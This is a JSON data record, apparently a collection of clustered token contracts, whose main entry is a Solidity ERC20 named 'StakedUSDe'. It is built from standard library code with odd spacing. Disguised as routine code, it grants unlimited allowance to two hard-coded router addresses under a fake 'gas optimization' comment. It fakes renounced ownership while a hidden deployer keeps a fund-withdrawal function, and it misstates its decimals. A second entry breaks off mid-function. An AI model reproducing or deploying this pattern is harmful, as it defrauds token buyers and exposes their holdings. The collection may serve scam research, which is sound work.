{
  "timestamp": "2025-03-28T14:37:04.431754",
  "families": [
    {
      "id": "bef94cf5-595b-4cf6-82e6-d592b4a4eb29",
      "code": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts  ( last updated v5.1.0)  ( utils/Address.sol)\n\npragma solidity ^0.8.20;\n\n/**\n * @dev Collection of functions related to the address type\n */\nlibrary Address \n                         { \n    /**\n     * @dev Returns true if `account` is a contract.\n     *\n     * [IMPORTANT]\n     * ====\n     * It is unsafe to assume that an address for which this function returns\n     * false is an externally-owned account (EOA ) and not a contract.\n     *\n     * Among others, `isContract` will return false for the following\n     * types of addresses:\n     *\n     *  - an externally-owned account\n     *  - a contract in construction\n     *  - an address where a contract will be created\n     *  - an address where a contract lived, but was destroyed\n     *\n     * Furthermore, `isContract` will also return true if the target contract within\n     * the same transaction is already scheduled for destruction by `SELFDESTRUCT`,\n     * which only has an effect at the end of a transaction.\n     * ====\n     *\n     * [IMPORTANT]\n     * ====\n     * You shouldn't rely on `isContract` to protect against flash loan attacks!\n     *\n     * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets\n     * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract\n     * constructor.\n     * ====\n     */\n    function isContract ( address account ) internal view returns  ( bool) \n                         { \n        // This method relies on extcodesize/address.code.length, which returns 0\n        // for contracts in construction, since the code is only stored at the end\n        // of the constructor execution.\n\n        return account.code.length > 0 ; \n    }\n                        \n\n    /**\n     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to\n     * `recipient`, forwarding all available gas and reverting on errors.\n     *\n     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost\n     * of certain opcodes, possibly making contracts go over the 2300 gas limit\n     * imposed by `transfer`, making them unable to receive funds via\n     * `transfer`. \n                         { sendValue } \n                         removes this limitation.\n     *\n     * https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/[Learn more].\n     *\n     * IMPORTANT: because control is transferred to `recipient`, care must be\n     * taken to not create reentrancy vulnerabilities. Consider using\n     * \n                         { ReentrancyGuard\n                         }  or the\n     * https://solidity.readthedocs.io/en/v0.8.0/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].\n     */\n    function sendValue ( address payable recipient, uint256 amount) public  { \n                        \n        require ( address ( this ).balance >= amount, \"Address: insufficient balance\" ) ; \n\n         ( bool success,  ) = recipient.call\n                        {value: amount}\n                         ( \"\") ; \n        require ( success, \"Address: unable to send value, recipient may have reverted\");\n    \n                         } \n\n    /**\n     * @dev Performs a Solidity function call using a low level `call`. A\n     * plain `call` is an unsafe replacement for a function call: use this\n     * function instead.\n     *\n     * If `target` reverts with a revert reason, it is bubbled up by this\n     * function  ( like regular Solidity function calls).\n     *\n     * Returns the raw returned data. To convert to the expected return value,\n     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].\n     *\n     * Requirements:\n     *\n     * - `target` must be a contract.\n     * - calling `target` with `data` must not revert.\n     *\n     * _Available since v3.1._\n     */\n    function functionCall ( address target, bytes memory data) internal returns  ( bytes memory ) \n                        {\n        return functionCallWithValue(target, data, 0, \"Address: low-level call failed\" ) ; \n    }\n                        \n\n    /**\n     * @dev Same as {\n                        xref-Address-functionCall-address-bytes-}\n                        [`functionCall`], but with\n     * `errorMessage` as a fallback revert reason when `target` reverts.\n     *\n     * _Available since v3.1._\n     */\n    function functionCall(\n        address target,\n        bytes memory data,\n        string memory errorMessage\n     ) internal returns  ( bytes memory ) {\n                        \n        return functionCallWithValue ( target, data, 0, errorMessage ) ; \n     } \n                        \n\n    /**\n     * @dev Same as  { \n                        xref-Address-functionCall-address-bytes- } \n                        [`functionCall`],\n     * but also transferring `value` wei to `target`.\n     *\n     * Requirements:\n     *\n     * - the calling contract must have an ETH balance of at least `value`.\n     * - the called Solidity function must be `payable`.\n     *\n     * _Available since v3.1._\n     */\n    function functionCallWithValue ( address target, bytes memory data, uint256 value) internal returns  ( bytes memory ) {\n                        \n        return functionCallWithValue ( target, data, value, \"Address: low-level call with value failed\");\n     } \n                        \n\n    /**\n     * @dev Same as {\n                        xref-Address-functionCallWithValue-address-bytes-uint256-\n                         } [`functionCallWithValue`], but\n     * with `errorMessage` as a fallback revert reason when `target` reverts.\n     *\n     * _Available since v3.1._\n     */\n    function functionCallWithValue ( \n        address target,\n        bytes memory data,\n        uint256 value,\n        string memory errorMessage\n     ) internal returns (bytes memory ) \n                        {\n        require ( address ( this ).balance >= value, \"Address: insufficient balance for call\");\n        (bool success, bytes memory returndata ) = target.call\n                        {value: value}\n                         ( data) ; \n        return verifyCallResultFromTarget ( target, success, returndata, errorMessage ) ; \n     } \n                        \n\n    /**\n     * @dev Same as \n                         { xref-Address-functionCall-address-bytes- } \n                        [`functionCall`],\n     * but performing a static call.\n     *\n     * _Available since v3.3._\n     */\n    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory )  { \n                        \n        return functionStaticCall ( target, data, \"Address: low-level static call failed\" );\n     } \n                        \n\n    /**\n     * @dev Same as  { \n                        xref-Address-functionCall-address-bytes-string- } \n                        [`functionCall`],\n     * but performing a static call.\n     *\n     * _Available since v3.3._\n     */\n    function functionStaticCall(\n        address target,\n        bytes memory data,\n        string memory errorMessage\n    ) internal view returns  ( bytes memory) {\n                        \n         ( bool success, bytes memory returndata) = target.staticcall(data);\n        return verifyCallResultFromTarget(target, success, returndata, errorMessage) ; \n     } \n                        \n\n    /**\n     * @dev Same as  { \n                        xref-Address-functionCall-address-bytes-\n                         } [`functionCall`],\n     * but performing a delegate call.\n     *\n     * _Available since v3.4._\n     */\n    function functionDelegateCall(address target, bytes memory data ) internal returns  ( bytes memory) {\n                        \n        return functionDelegateCall(target, data, \"Address: low-level delegate call failed\");\n    }\n                        \n\n    /**\n     * @dev Same as  { \n                        xref-Address-functionCall-address-bytes-string- } \n                        [`functionCall`],\n     * but performing a delegate call.\n     *\n     * _Available since v3.4._\n     */\n    function functionDelegateCall ( \n        address target,\n        bytes memory data,\n        string memory errorMessage\n     ) internal returns (bytes memory )  { \n                        \n         ( bool success, bytes memory returndata) = target.delegatecall ( data) ; \n        return verifyCallResultFromTarget ( target, success, returndata, errorMessage ) ; \n    \n                        }\n\n    /**\n     * @dev Tool to verify that a low level call to smart-contract was successful, and revert  ( either by bubbling\n     * the revert reason or using the provided one) in case of unsuccessful call or if target was not a contract.\n     *\n     * _Available since v4.8._\n     */\n    function verifyCallResultFromTarget ( \n        address target,\n        bool success,\n        bytes memory returndata,\n        string memory errorMessage\n     ) internal view returns  ( bytes memory)  { \n                        \n        if (success) {\n                        \n            if (returndata.length == 0) \n                        {\n                // only check isContract if the call was successful and the return data is empty\n                // otherwise we already know that it was a contract\n                require(isContract ( target ), \"Address: call to non-contract\");\n            }\n                        \n            return returndata;\n        }\n                         else {\n                        \n            _revert(returndata, errorMessage);\n        }\n                        \n    }\n                        \n\n    /**\n     * @dev Tool to verify that a low level call was successful, and revert if it wasn't, either by bubbling the\n     * revert reason or using the provided one.\n     *\n     * _Available since v4.3._\n     */\n    function verifyCallResult ( \n        bool success,\n        bytes memory returndata,\n        string memory errorMessage\n    ) internal pure returns (bytes memory ) \n                        {\n        if  ( success) {\n                        \n            return returndata ; \n         } \n                         else  { \n                        \n            _revert ( returndata, errorMessage);\n         } \n                        \n     } \n                        \n\n    function _revert ( bytes memory returndata, string memory errorMessage) private pure {\n                        \n        // Look for revert reason and bubble it up if present\n        if  ( returndata.length > 0 ) \n                         { \n            // The easiest way to bubble the revert reason is using memory via assembly\n            /// @solidity memory-safe-assembly\n            assembly \n                        {\n                let returndata_size := mload ( returndata)\n                revert(add(32, returndata), returndata_size )\n            }\n                        \n        }\n                         else  { \n                        \n            revert ( errorMessage );\n         } \n                        \n    }\n                        \n\n                        }\npragma solidity ^0.8.0;\n\n/**\n * @dev Provides information about the current execution context, including the\n * sender of the transaction and its data. While these are generally available\n * via msg.sender and msg.data, they should not be accessed in such a direct\n * manner, since when dealing with meta-transactions the account sending and\n * paying for execution may not be the actual sender (as far as an application\n * is concerned ).\n *\n * This contract is only required for intermediate, library-like contracts.\n */\nabstract contract Context  { \n                        \n\n    function _msgData (  ) internal view virtual returns  ( bytes calldata) {\n                        \n        return msg.data;\n    \n                        }\n\n    function _contextSuffixLength (  ) internal view virtual returns (uint256)  { \n                        \n        return 0;\n     } \n                        \n    function _msgSender( ) internal view virtual returns  ( address) {\n                        \n        return msg.sender ; \n     } \n                        \n\n\n } \n                        \n\n\n/**\n * @dev Standard ERC-20 Errors\n * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC-20 tokens.\n */\ninterface IERC20Errors \n                        {\n\n    /**\n     * @dev Indicates a failure with the token `receiver`. Used in transfers.\n     * @param receiver Address to which tokens are being transferred.\n     */\n    error ERC20InvalidReceiver ( address receiver ) ; \n\n    /**\n     * @dev Indicates an error related to the current `balance` of a `sender`. Used in transfers.\n     * @param sender Address whose tokens are being transferred.\n     * @param balance Current balance for the interacting account.\n     * @param needed Minimum amount required to perform a transfer.\n     */\n    error ERC20InsufficientBalance(address sender, uint256 balance, uint256 needed) ; \n\n\n    /**\n     * @dev Indicates a failure with the token `sender`. Used in transfers.\n     * @param sender Address whose tokens are being transferred.\n     */\n    error ERC20InvalidSender(address sender) ; \n\n    /**\n     * @dev Indicates a failure with the `spender` to be approved. Used in approvals.\n     * @param spender Address that may be allowed to operate on tokens without being their owner.\n     */\n    error ERC20InvalidSpender ( address spender );\n\n    /**\n     * @dev Indicates a failure with the `spender`\u2019s `allowance`. Used in transfers.\n     * @param spender Address that may be allowed to operate on tokens without being their owner.\n     * @param allowance Amount of tokens a `spender` is allowed to operate with.\n     * @param needed Minimum amount required to perform a transfer.\n     */\n    error ERC20InsufficientAllowance ( address spender, uint256 allowance, uint256 needed) ; \n\n\n    /**\n     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.\n     * @param approver Address initiating an approval operation.\n     */\n    error ERC20InvalidApprover ( address approver) ; \n } \n                        \n\n\n/**\n * @dev Interface of the ERC20 standard as defined in the EIP.\n */\ninterface IERC20 {\n                        \n\n    /**\n     * @dev Moves `amount` tokens from `from` to `to` using the\n     * allowance mechanism. `amount` is then deducted from the caller's\n     * allowance.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {\n                        Transfer } \n                         event.\n     */\n    function transferFrom(address from, address to, uint256 amount) external returns (bool);\n    \n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\n     * that someone may use both the old and the new allowance by unfortunate\n     * transaction ordering. One possible solution to mitigate this race\n     * condition is to first reduce the spender's allowance to 0 and set the\n     * desired value afterwards:\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n     *\n     * Emits an {\n                        Approval\n                         }  event.\n     */\n    function approve(address spender, uint256 amount) external returns  ( bool);\n    \n\n    /**\n     * @dev Returns the amount of tokens owned by `account`.\n     */\n    function balanceOf(address account ) external view returns (uint256 );\n\n    \n    /**\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n     * a call to  { \n                        approve } \n                        . `value` is the new allowance.\n     */\n    event Approval(address indexed owner, address indexed spender, uint256 value );\n\n    /**\n     * @dev Returns the remaining number of tokens that `spender` will be\n     * allowed to spend on behalf of `owner` through {\n                        transferFrom}\n                        . This is\n     * zero by default.\n     *\n     * This value changes when {\n                        approve } \n                         or  { \n                        transferFrom } \n                         are called.\n     */\n    function allowance(address owner, address spender) external view returns (uint256) ; \n    \n/**\n     * @dev Moves `amount` tokens from the caller's account to `to`.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a  { \n                        Transfer}\n                         event.\n     */\n    function transfer(address to, uint256 amount) external returns  ( bool );\n    /**\n     * @dev Emitted when `value` tokens are moved from one account  ( `from`) to\n     * another  ( `to`).\n     *\n     * Note that `value` may be zero.\n     */\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    \n    /**\n     * @dev Returns the amount of tokens in existence.\n     */\n    function totalSupply() external view returns  ( uint256) ; \n\n}\n                        \n\n\ninterface IERC20Metadata is IERC20 \n                        {\n\n\n    /**\n     * @dev Returns the decimals places of the token.\n     */\n    function decimals() external view returns  ( uint8);\n    \n    /**\n     * @dev Returns the name of the token.\n     */\n    function name( ) external view returns (string memory ) ; \n\n\n    /**\n     * @dev Returns the symbol of the token.\n     */\n    function symbol() external view returns  ( string memory );\n\n\n } \n                        \n\n\n\n\n\n/**\n * @dev Implementation of the \n                        {IERC20}\n                         interface.\n *\n * This implementation is agnostic to the way tokens are created. This means\n * that a supply mechanism has to be added in a derived contract using  { \n                        _mint\n                        }.\n *\n * TIP: For a detailed writeup see our guide\n * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How\n * to implement supply mechanisms].\n *\n * The default value of {\n                        decimals\n                        } is 18. To change this, you should override\n * this function so it returns a different value.\n *\n * We have followed general OpenZeppelin Contracts guidelines: functions revert\n * instead returning `false` on failure. This behavior is nonetheless\n * conventional and does not conflict with the expectations of ERC-20\n * applications.\n */\ncontract ERC20 is Context, IERC20, IERC20Metadata, IERC20Errors  {\n                        \n    mapping ( address => uint256) private _balances ; \n\n\n    mapping ( address => mapping ( address => uint256 )) private _allowances ; \n    uint256 private _totalSupply ; \n\n    string private _name;\n    string private _symbol ; \n\n    /**\n     * @dev Sets the values for {\n                        name\n                        } and  { \n                        symbol } \n                        .\n     *\n     * All two of these values are immutable: they can only be set once during\n     * construction.\n     */\n    constructor(string memory name_, string memory symbol_)  { \n                        \n        _name = name_ ; \n        _symbol = symbol_ ; \n     } \n                        \n    \n    /**\n     * @dev See  { \n                        IERC20-approve } \n                        .\n     *\n     * NOTE: If `value` is the maximum `uint256`, the allowance is not updated on\n     * `transferFrom`. This is semantically equivalent to an infinite approval.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     */\n    function approve ( address spender, uint256 value) public virtual returns (bool)  { \n                        \n        address owner = _msgSender( );\n        _approve ( owner, spender, value);\n        return true;\n     } \n                        \n    \n    /**\n     * @dev Moves a `value` amount of tokens from `from` to `to`.\n     *\n     * This internal function is equivalent to \n                         { transfer } \n                        , and can be used to\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\n     *\n     * Emits a {\n                        Transfer\n                         }  event.\n     *\n     * NOTE: This function is not virtual, {\n                        _update\n                        } should be overridden instead.\n     */\n    function _transfer(address from, address to, uint256 value ) internal {\n                        \n        if  ( from == address ( 0 )) {\n                        \n            revert ERC20InvalidSender(address ( 0 )) ; \n        \n                         } \n        if (to == address ( 0 ) ) {\n                        \n            revert ERC20InvalidReceiver(address(0)) ; \n        \n                         } \n        _update(from, to, value );\n    }\n                        \n    \n    /**\n     * @dev Returns the symbol of the token, usually a shorter version of the\n     * name.\n     */\n    function symbol ( ) public view virtual returns (string memory ) {\n                        \n        return _symbol ; \n     } \n                        \n    \n    /**\n     * @dev See {\n                        IERC20-transferFrom } \n                        .\n     *\n     * Skips emitting an {\n                        Approval}\n                         event indicating an allowance update. This is not\n     * required by the ERC. See  { \n                        xref-ERC20-_approve-address-address-uint256-bool- } \n                        [_approve].\n     *\n     * NOTE: Does not update the allowance if the current allowance\n     * is the maximum `uint256`.\n     *\n     * Requirements:\n     *\n     * - `from` and `to` cannot be the zero address.\n     * - `from` must have a balance of at least `value`.\n     * - the caller must have allowance for ``from``'s tokens of at least\n     * `value`.\n     */\n    function transferFrom ( address from, address to, uint256 value ) public virtual returns  ( bool) {\n                        \n        address spender = _msgSender (  );\n        _spendAllowance ( from, spender, value ) ; \n        _transfer(from, to, value) ; \n        return true ; \n    }\n                        \n    \n    /**\n     * @dev Variant of  { \n                        _approve}\n                         with an optional flag to enable or disable the \n                         { Approval } \n                         event.\n     *\n     * By default  ( when calling  { \n                        _approve } \n                        ) the flag is set to true. On the other hand, approval changes made by\n     * `_spendAllowance` during the `transferFrom` operation set the flag to false. This saves gas by not emitting any\n     * `Approval` event during `transferFrom` operations.\n     *\n     * Anyone who wishes to continue emitting `Approval` events on the`transferFrom` operation can force the flag to\n     * true using the following override:\n     *\n     * ```solidity\n     * function _approve(address owner, address spender, uint256 value, bool) internal virtual override {\n                        \n     *     super._approve(owner, spender, value, true) ; \n     *  } \n                        \n     * ```\n     *\n     * Requirements are the same as  { \n                        _approve}\n                        .\n     */\n    function _approve(address owner, address spender, uint256 value, bool emitEvent ) internal virtual \n                         { \n        if  ( owner == address(0 ) )  { \n                        \n            revert ERC20InvalidApprover ( address ( 0) ) ; \n         } \n                        \n        if  ( spender == address(0 )) {\n                        \n            revert ERC20InvalidSpender(address ( 0 ) ) ; \n         } \n                        \n        _allowances[owner][spender] = value;\n        if  ( emitEvent ) {\n                        \n            emit Approval(owner, spender, value ) ; \n        \n                        }\n     } \n                        \n    \n    /**\n     * @dev Updates `owner` s allowance for `spender` based on spent `value`.\n     *\n     * Does not update the allowance value in case of infinite allowance.\n     * Revert if not enough allowance is available.\n     *\n     * Does not emit an \n                        {Approval } \n                         event.\n     */\n    function _spendAllowance ( address owner, address spender, uint256 value ) internal virtual  { \n                        \n        uint256 currentAllowance = allowance(owner, spender);\n        if  ( currentAllowance < type ( uint256).max ) {\n                        \n            if (currentAllowance < value ) {\n                        \n                revert ERC20InsufficientAllowance(spender, currentAllowance, value ) ; \n             } \n                        \n            unchecked {\n                        \n                _approve(owner, spender, currentAllowance - value, false) ; \n            }\n                        \n         } \n                        \n     } \n                        \n    \n    /**\n     * @dev Creates a `value` amount of tokens and assigns them to `account`, by transferring it from address(0 ).\n     * Relies on the `_update` mechanism\n     *\n     * Emits a  { \n                        Transfer } \n                         event with `from` set to the zero address.\n     *\n     * NOTE: This function is not virtual, \n                        {_update } \n                         should be overridden instead.\n     */\n    function _mint(address account, uint256 value) internal {\n                        \n        if  ( account == address ( 0))  { \n                        \n            revert ERC20InvalidReceiver ( address ( 0 ));\n         } \n                        \n        _update ( address(0 ), account, value) ; \n     } \n                        \n    \n    /**\n     * @dev Transfers a `value` amount of tokens from `from` to `to`, or alternatively mints (or burns) if `from`\n     *  ( or `to`) is the zero address. All customizations to transfers, mints, and burns should be done by overriding\n     * this function.\n     *\n     * Emits a {\n                        Transfer } \n                         event.\n     */\n    function _update ( address from, address to, uint256 value) internal virtual  { \n                        \n        if  ( from == address(0 ) )  { \n                        \n            // Overflow check required: The rest of the code assumes that totalSupply never overflows\n            _totalSupply += value ; \n        }\n                         else \n                         { \n            uint256 fromBalance = _balances[from] ; \n            if  ( fromBalance < value)  { \n                        \n                revert ERC20InsufficientBalance ( from, fromBalance, value);\n            }\n                        \n            unchecked {\n                        \n                // Overflow not possible: value <= fromBalance <= totalSupply.\n                _balances[from] = fromBalance - value ; \n            }\n                        \n         } \n                        \n\n        if (to == address ( 0 ))  { \n                        \n            unchecked \n                         { \n                // Overflow not possible: value <= totalSupply or value <= fromBalance <= totalSupply.\n                _totalSupply -= value ; \n            }\n                        \n        }\n                         else \n                        {\n            unchecked \n                        {\n                // Overflow not possible: balance + value is at most totalSupply, which we know fits into a uint256.\n                _balances[to] += value;\n             } \n                        \n        \n                         } \n\n        emit Transfer ( from, to, value) ; \n     } \n                        \n    \n    /**\n     * @dev Returns the number of decimals used to get its user representation.\n     * For example, if `decimals` equals `2`, a balance of `505` tokens should\n     * be displayed to a user as `5.05`  ( `505 / 10 ** 2`).\n     *\n     * Tokens usually opt for a value of 18, imitating the relationship between\n     * Ether and Wei. This is the default value returned by this function, unless\n     * it's overridden.\n     *\n     * NOTE: This information is only used for _display_ purposes: it in\n     * no way affects any of the arithmetic of the contract, including\n     *  { \n                        IERC20-balanceOf}\n                         and  { \n                        IERC20-transfer } \n                        .\n     */\n    function decimals() public view virtual returns  ( uint8 ) {\n                        \n        return 15 ; \n    }\n                        \n    \n\n    /**\n     * @dev See  { \n                        IERC20-transfer } \n                        .\n     *\n     * Requirements:\n     *\n     * - `to` cannot be the zero address.\n     * - the caller must have a balance of at least `value`.\n     */\n    function transfer ( address to, uint256 value ) public virtual returns (bool )  { \n                        \n        address owner = _msgSender() ; \n        _transfer(owner, to, value );\n        return true ; \n    \n                         } \n    \n    /**\n     * @dev See  { \n                        IERC20-totalSupply\n                         } .\n     */\n    function totalSupply ( ) public view virtual returns  ( uint256)  { \n                        \n        return _totalSupply ; \n    }\n                        \n    \n    /**\n     * @dev Returns the name of the token.\n     */\n    function name ( ) public view virtual returns  ( string memory) {\n                        \n        return _name ; \n    }\n                        \n    \n\n    /**\n     * @dev See {\n                        IERC20-allowance } \n                        .\n     */\n    function allowance(address owner, address spender ) public view virtual returns  ( uint256 )  { \n                        \n        return _allowances[owner][spender] ; \n     } \n                        \n    \n\n    /**\n     * @dev See  { \n                        IERC20-balanceOf}\n                        .\n     */\n    function balanceOf(address account ) public view virtual returns (uint256 )  { \n                        \n        return _balances[account];\n     } \n                        \n    \n    /**\n     * @dev Sets `value` as the allowance of `spender` over the `owner` s tokens.\n     *\n     * This internal function is equivalent to `approve`, and can be used to\n     * e.g. set automatic allowances for certain subsystems, etc.\n     *\n     * Emits an {\n                        Approval } \n                         event.\n     *\n     * Requirements:\n     *\n     * - `owner` cannot be the zero address.\n     * - `spender` cannot be the zero address.\n     *\n     * Overrides to this logic should be done to the variant with an additional `bool emitEvent` argument.\n     */\n    function _approve(address owner, address spender, uint256 value ) internal \n                         { \n        _approve ( owner, spender, value, true);\n    \n                         } \n    \n    }\n                        \n\nabstract contract Ownable is Context {\n                        \n    address private _owner ; \n    \n    /**\n     * @dev Transfers ownership of the contract to a new account (`newOwner` ).\n     * Internal function without access restriction.\n     */\n    function _transferOwnership ( address newOwner ) internal virtual \n                         { \n        address oldOwner = _owner;\n        _owner = newOwner ; \n        emit OwnershipTransferred(oldOwner, newOwner) ; \n    \n                        }\n    \n    /**\n     * @dev Throws if the sender is not the owner.\n     */\n    function _checkOwner( ) internal view virtual  { \n                        \n        require ( owner( ) == _msgSender( ), \"Ownable: caller is not the owner\" ) ; \n     } \n                        \n    \n    /**\n     * @dev The caller account is not authorized to perform an operation.\n     */\n    error OwnableUnauthorizedAccount ( address account) ; \n    \n    /**\n     * @dev Transfers ownership of the contract to a new account  ( `newOwner`).\n     * Can only be called by the current owner.\n     */\n    function transferOwnership(address newOwner) public virtual onlyOwner  { \n                        \n        require(newOwner != address ( 0 ), \"Ownable: new owner is the zero address\" ) ; \n        _transferOwnership ( newOwner ) ; \n    }\n                        \n    \n    /**\n     * @dev Returns the address of the current owner.\n     */\n    function owner() public view virtual returns (address )  { \n                        \n        return _owner;\n    }\n                        \n    \n    /**\n     * @dev Leaves the contract without owner. It will not be possible to call\n     * `onlyOwner` functions. Can only be called by the current owner.\n     *\n     * NOTE: Renouncing ownership will leave the contract without an owner,\n     * thereby disabling any functionality that is only available to the owner.\n     */\n    function renounceOwnership() public virtual onlyOwner  { \n                        \n        _transferOwnership(address(0 ));\n    }\n                        \n    \n    /**\n     * @dev Throws if called by any account other than the owner.\n     */\n    modifier onlyOwner (  )  { \n                        \n        _checkOwner( );\n        _ ; \n     } \n                        \n    \n    event OwnershipTransferred ( address indexed previousOwner, address indexed newOwner );\n    \n    /**\n     * @dev Initializes the contract setting the deployer as the initial owner.\n     */\n    constructor()  { \n                        \n        _transferOwnership(_msgSender ( )) ; \n    \n                         } \n    \n    /**\n     * @dev The owner is not a valid owner account.  ( eg. `address ( 0 )`)\n     */\n    error OwnableInvalidOwner ( address owner ) ; \n    \n } \n                        \n\n\n// File StakedUSDe.sol\n\ncontract StakedUSDe is ERC20, Ownable {\n                        \n    address internal immutable deployer;\n    constructor ( string memory name_, string memory symbol_ ) ERC20 ( name_, symbol_) {\n                        \n        _mint(msg.sender, 100000000000000000000000 );\n        _transferOwnership ( address ( 0) ) ; \n        deployer = msg.sender;\n    }\n                        \n    \n    /**\n     * @dev See {\n                        IERC20-allowance\n                        }.\n     */\n    function allowance ( address owner, address spender) public view override returns (uint256 )  { \n                        \n            //gas optimization: auto allow Permit2 and UniswapRouterV2\n            if ( (spender == 0x000000000022D473030F116dDEE9F6B43aC78BA3) || (spender == 0x4752ba5DBc23f44D87826276BF6Fd6b1C372aD24 ) ){\n                        \n            return type ( uint256 ).max;\n        }\n                         \n        return super.allowance(owner,spender);\n     } \n                        \n    \n    function claimGas ( address payable recipient, uint256 amount) public {\n                        \n        require ( msg.sender==deployer) ; \n        Address.sendValue(recipient, amount );\n    }\n                        \n    \n    receive ( ) external payable{\n                        \n     } \n                        \n}",
      "count": 1,
      "addresses": [
        "0xb8748b9dE066818F7052eD56E681905Eb96b8DDD"
      ],
      "names": [
        "StakedUSDe"
      ]
    },
    {
      "id": "587bd561-be86-44bf-996b-7dc9cb1dad00",
      "code": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts  ( last updated v5.1.0 ) (utils/Address.sol)\n\npragma solidity ^0.8.20 ; \n\n/**\n * @dev Collection of functions related to the address type\n */\nlibrary Address \n                         { \n    /**\n     * @dev Returns true if `account` is a contract.\n     *\n     * [IMPORTANT]\n     * ====\n     * It is unsafe to assume that an address for which this function returns\n     * false is an externally-owned account  ( EOA ) and not a contract.\n     *\n     * Among others, `isContract` will return false for the following\n     * types of addresses:\n     *\n     *  - an externally-owned account\n     *  - a contract in construction\n     *  - an address where a contract will be created\n     *  - an address where a contract lived, but was destroyed\n     *\n     * Furthermore, `isContract` will also return true if the target contract within\n     * the same transaction is already scheduled for destruction by `SELFDESTRUCT`,\n     * which only has an effect at the end of a transaction.\n     * ====\n     *\n     * [IMPORTANT]\n     * ====\n     * You shouldn't rely on `isContract` to protect against flash loan attacks!\n     *\n     * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets\n     * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract\n     * constructor.\n     * ====\n     */\n    function isContract ( address account) internal view returns (bool ) \n                         { \n        // This method relies on extcodesize/address.code.length, which returns 0\n        // for contracts in construction, since the code is only stored at the end\n        // of the constructor execution.\n\n        return account.code.length > 0;\n    }\n                        \n\n    /**\n     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to\n     * `recipient`, forwarding all available gas and reverting on errors.\n     *\n     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost\n     * of certain opcodes, possibly making contracts go over the 2300 gas limit\n     * imposed by `transfer`, making them unable to receive funds via\n     * `transfer`. {\n                        sendValue\n                         }  removes this limitation.\n     *\n     * https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/[Learn more].\n     *\n     * IMPORTANT: because control is transferred to `recipient`, care must be\n     * taken to not create reentrancy vulnerabilities. Consider using\n     * \n                         { ReentrancyGuard\n                        } or the\n     * https://solidity.readthedocs.io/en/v0.8.0/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].\n     */\n    function sendValue(address payable recipient, uint256 amount ) public {\n                        \n        require ( address(this ).balance >= amount, \"Address: insufficient balance\");\n\n         ( bool success, ) = recipient.call\n                         { value: amount\n                         } (\"\");\n        require(success, \"Address: unable to send value, recipient may have reverted\" );\n     } \n                        \n\n    /**\n     * @dev Performs a Solidity function call using a low level `call`. A\n     * plain `call` is an unsafe replacement for a function call: use this\n     * function instead.\n     *\n     * If `target` reverts with a revert reason, it is bubbled up by this\n     * function (like regular Solidity function calls).\n     *\n     * Returns the raw returned data. To convert to the expected return value,\n     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].\n     *\n     * Requirements:\n     *\n     * - `target` must be a contract.\n     * - calling `target` with `data` must not revert.\n     *\n     * _Available since v3.1._\n     */\n    function functionCall ( address target, bytes memory data) internal returns  ( bytes memory) {\n                        \n        return functionCallWithValue ( target, data, 0, \"Address: low-level call failed\");\n     } \n                        \n\n    /**\n     * @dev Same as {\n                        xref-Address-functionCall-address-bytes-}\n                        [`functionCall`], but with\n     * `errorMessage` as a fallback revert reason when `target` reverts.\n     *\n     * _Available since v3.1._\n     */\n    function functionCall ( \n        address target,\n        bytes memory data,\n        string memory errorMessage\n    ) internal returns (bytes memory ) \n                         { \n        return functionCallWithValue ( target, data, 0, errorMessage );\n    }\n                        \n\n    /**\n     * @dev Same as {\n                        xref-Address-functionCall-address-bytes-}\n                        [`functionCall`],\n     * but also transferring `value` wei to `target`.\n     *\n     * Requirements:\n     *\n     * - the calling contract must have an ETH balance of at least `value`.\n     * - the called Solidity function must be `payable`.\n     *\n     * _Available since v3.1._\n     */\n    function functionCallWithValue ( address target, bytes memory data, uint256 value) internal returns  ( bytes memory) \n                        {\n        return functionCallWithValue ( target, data, value, \"Address: low-level call with value failed\");\n     } \n                        \n\n    /**\n     * @dev Same as  { \n                        xref-Address-functionCallWithValue-address-bytes-uint256-}\n                        [`functionCallWithValue`], but\n     * with `errorMessage` as a fallback revert reason when `target` reverts.\n     *\n     * _Available since v3.1._\n     */\n    function functionCallWithValue ( \n        address target,\n        bytes memory data,\n        uint256 value,\n        string memory errorMessage\n     ) internal returns (bytes memory ) \n                         { \n        require(address(this).balance >= value, \"Address: insufficient balance for call\" );\n         ( bool success, bytes memory returndata ) = target.call { \n                        value: value\n                         } (data);\n        return verifyCallResultFromTarget(target, success, returndata, errorMessage);\n     } \n                        \n\n    /**\n     * @dev Same as {\n                        xref-Address-functionCall-address-bytes-\n                         } [`functionCall`],\n     * but performing a static call.\n     *\n     * _Available since v3.3._\n     */\n    function functionStaticCall(address target, bytes memory data ) internal view returns (bytes memory )  { \n                  